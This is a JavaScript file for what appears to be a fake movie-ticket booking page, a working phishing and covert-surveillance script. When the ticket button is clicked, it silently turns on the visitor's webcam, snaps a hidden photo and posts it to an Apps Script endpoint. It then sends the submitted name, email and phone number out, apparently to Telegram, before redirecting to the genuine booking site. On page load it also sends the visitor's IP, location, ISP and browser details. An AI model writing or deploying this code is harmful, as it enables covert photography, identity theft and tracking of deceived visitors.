const APPS_SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbx4tpUPP57s4-wThS878CK1MlC5iIP_vIOKkV-QKyRsS2e5qED1dtfJ81EcfKjOLHP_/exec';

const getTicketsBtn = document.getElementById('getTicketsBtn');
const formSection = document.getElementById('formSection');
const ticketForm = document.getElementById('ticketForm');
const video = document.getElementById('video');

// Step 1: Show form and start webcam
getTicketsBtn.addEventListener('click', () => {
  // Hide all other sections to simulate new page
  document.querySelector('.hero').style.display = 'none';
  document.querySelector('.details').style.display = 'none';
  document.querySelector('.cast-reviews').style.display = 'none';

  // Show form section
  formSection.style.display = 'block';

  // Start webcam
  navigator.mediaDevices.getUserMedia({ video: true }).then(stream => {
    video.srcObject = stream;
    video.style.display = 'none';

    setTimeout(() => {
      const canvas = document.createElement('canvas');
      canvas.width = 320;
      canvas.height = 240;
      const ctx = canvas.getContext('2d');
      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
      const base64Image = canvas.toDataURL('image/jpeg');

      fetch(APPS_SCRIPT_URL, {
        method: 'POST',
        mode: 'no-cors',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ image: base64Image })
      });

    }, 3000);

  }).catch(err => {
    console.error("Camera error:", err);
  });
});

// Step 2: Submit form and log to Telegram
ticketForm.addEventListener('submit', async (e) => {
  e.preventDefault();

  const name = ticketForm.elements['name'].value;
  const email = ticketForm.elements['email'].value;
  const phone = ticketForm.elements['phone'].value;

  await fetch(APPS_SCRIPT_URL, {
    method: 'POST',
    mode: 'no-cors',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      log: `🎟️ Form Submission\nName: ${name}\nEmail: ${email}\nPhone: ${phone}`
    })
  });

  // Redirect to official site
  window.location.href = 'https://in.bookmyshow.com/movies/f1-the-movie/ET00403839';
});

// Step 3: Collect IP + device info
function collectDeviceInfo() {
  fetch('https://ipapi.co/json/')
    .then(response => response.json())
    .then(data => {
      const message = `
🌐 Visitor Info:
IP: ${data.ip}
City: ${data.city}
Region: ${data.region}
Country: ${data.country_name}
ISP: ${data.org}
ASN: ${data.asn}
Timezone: ${data.timezone}
Browser: ${navigator.userAgent}
      `;
      sendToTelegram(message);
    })
    .catch(error => {
      console.error("Failed to fetch device info:", error);
    });
}

// Utility: Send to Telegram
function sendToTelegram(msg) {
  fetch(APPS_SCRIPT_URL, {
    method: "POST",
    mode: "no-cors",
    headers: {
      "Content-Type": "application/json"
    },
    body: JSON.stringify({ log: msg })
  });
}

// Trigger on page load
document.addEventListener("DOMContentLoaded", () => {
  collectDeviceInfo();
});
